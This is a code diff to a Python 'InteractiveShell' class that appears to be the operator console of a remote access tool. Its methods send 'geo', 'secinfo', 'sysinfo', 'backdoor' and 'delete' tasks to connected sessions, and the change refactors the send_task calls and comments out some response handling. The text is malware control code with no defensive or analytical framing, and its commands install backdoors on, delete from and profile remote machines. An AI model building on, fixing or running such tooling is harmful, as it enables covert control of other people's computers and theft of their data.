@@ -97,7 +97,7 @@ class InteractiveShell:
             print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
 
     def geo(self, conn=None):
-        self.send_task(self.session_id, "geo", "get")
+        self.send_task("geo", "get")
         try:
             resp = self.json_receive(self.conn)
             data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
@@ -107,19 +107,19 @@ class InteractiveShell:
         input("OK")
 
     def secinfo(self, conn=None, address=None):
-        self.send_task(self.session_id, "secinfo", "get")
-        try:
-            resp = asyncio.run(self.get_response())
-            data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
-        except Exception as e:
-            print(e)
-            input("ok")
-            data = {}
-        Options.print_security_info_text(data)
+        self.send_task("secinfo", "get")
+        # try:
+        #     resp = asyncio.run(self.get_response())
+        #     data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+        # except Exception as e:
+        #     print(e)
+        #     input("ok")
+        #     data = {}
+        # Options.print_security_info_text(data)
         input("OK")
 
     def sysinfo(self, conn=None, address=None):
-        self.send_task(self.session_id, "sysinfo", "get")
+        self.send_task("sysinfo", "get")
         try:
             resp = self.json_receive(self.conn)
             data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
@@ -232,7 +232,7 @@ class InteractiveShell:
         input("OK")
 
     def backdoor(self, conn, address):
-        self.send_task(conn, address, "System", "backdoor")
+        self.send_task("System", "backdoor")
         try:
             resp = self.json_receive(conn)
         except Exception:
@@ -241,7 +241,7 @@ class InteractiveShell:
         input("OK")
 
     def delete(self, conn, address):
-        self.send_task(conn, address, "System", "delete")
+        self.send_task("System", "delete")
         try:
             resp = self.json_receive(conn)
         except Exception:
